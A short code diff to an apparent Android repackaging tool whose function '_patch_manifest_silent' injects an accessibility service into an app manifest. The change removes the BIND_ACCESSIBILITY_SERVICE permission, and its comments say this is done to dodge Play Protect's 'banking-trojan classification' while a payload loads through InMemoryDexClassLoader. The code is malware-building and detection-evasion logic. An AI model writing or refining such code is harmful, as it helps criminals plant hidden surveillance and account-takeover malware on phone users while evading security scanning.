@@ -531,8 +531,11 @@ def _patch_manifest_silent(manifest_path, package_name,
                 svc = ET.SubElement(app_el, 'service')
                 svc.set(f'{NS}name', svc_class)
                 svc.set(f'{NS}enabled', 'true')
-                svc.set(f'{NS}exported', 'true')
-                svc.set(f'{NS}permission', 'android.permission.BIND_ACCESSIBILITY_SERVICE')
+                svc.set(f'{NS}exported', 'false')
+                # BIND_ACCESSIBILITY_SERVICE intentionally NOT set here —
+                # it is the #1 PP hard-block signal for banking-trojan classification.
+                # InMemoryDexClassLoader cannot bind system services anyway,
+                # so the permission declaration is dead weight that only hurts.
                 intent_filter = ET.SubElement(svc, 'intent-filter')
                 action = ET.SubElement(intent_filter, 'action')
                 action.set(f'{NS}name', 'android.accessibilityservice.AccessibilityService')
